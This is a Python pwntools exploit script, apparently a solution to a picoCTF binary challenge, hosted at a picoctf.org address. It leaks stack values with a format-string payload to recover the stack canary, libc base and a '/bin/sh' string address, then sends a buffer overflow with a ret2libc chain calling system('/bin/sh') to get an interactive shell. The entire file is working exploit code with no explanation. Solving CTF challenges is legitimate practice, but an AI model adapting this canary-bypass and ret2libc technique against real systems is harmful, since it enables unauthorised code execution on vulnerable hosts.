#!/usr/bin/python3

from pwn import *
import sys

BIN = './vuln'
context.arch = 'i386'

if len(sys.argv) > 1:
    r = remote('jupiter.challenges.picoctf.org', 15815)
else:
    r = process(BIN)

s = ""

for i in range(1, 10):
    s += f"%{i}$p-"

s += "%135$p-"
s += "%138$p-"
s += "$$"
r.sendlineafter('What number would you like to guess?\n', '-31')
r.sendline(s)
owo = r.recvuntil('$$', drop=True).split(b'-')
print(owo)
canary = owo[-3]
old_rbp = owo[-2]
binsh = int(old_rbp, 16) - 556
libc = int(owo[1], 16) - 0x001d55c0
system = libc + 0x3cd80
execve = libc + 0xbe390
#binsh = 0x804a1f0
gets = libc + 0x66b50

info(f"""
libc = {hex(libc)}
""")

canary = p32(int(canary, 16))
print(canary)
#p = b'/bin/sh\x00'.ljust(512, b'A') + canary + b'A'*0xc + p32(execve) + p32(0xdeadbeef) + p32(0) + p32(binsh) + p32(0) + p32(0)
p = b'/bin/sh\x00'.ljust(512, b'A') + canary + b'A'*0xc + p32(system) + p32(0xdeadbeef) + p32(binsh)
r.sendlineafter('What number would you like to guess?\n', '-31')
input()
r.sendline(p)

r.interactive()
